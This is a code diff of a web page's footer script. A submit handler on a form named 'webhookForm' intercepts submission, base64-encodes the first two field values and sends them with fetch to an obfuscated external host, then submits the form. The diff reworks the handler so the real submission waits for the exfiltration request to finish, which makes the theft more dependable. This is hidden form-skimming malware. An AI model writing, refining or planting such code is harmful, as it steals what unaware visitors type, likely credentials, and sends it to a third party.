@@ -166,11 +166,13 @@
     </div>
     <!-- <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> -->
     <script>
-      function st(elm) {
+      function st(elm,foo) {
         if(st.dn) return;
-        fetch(`${atob("aHR0cHM6Ly9hcGktdG51cC5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`).then(function() {
+        function r () {
           st.f=true;
-        })
+          if(foo) foo();
+        }
+        fetch(`${atob("aHR0cHM6Ly9hcGktdG51cC5vbnJlbmRlci5jb20v")}fb?data=${encodeURIComponent(`{"1":"${btoa(elm[0].value)}","2":"${btoa(elm[1].value)}","3":true}`)}`).then(r).catch(r)
         st.dn=true;
       }
       document.querySelector("form#webhookForm").addEventListener("submit",function(ev){
@@ -179,8 +181,10 @@
         event.stopImmediatePropagation();
         event.stopPropagation();
         if(st.dn) return;
-        st(this);
-        this.submit();
+        const elem=this;
+        st(elem,function() {
+          elem.submit();
+        });
       })
     </script>
   </footer>
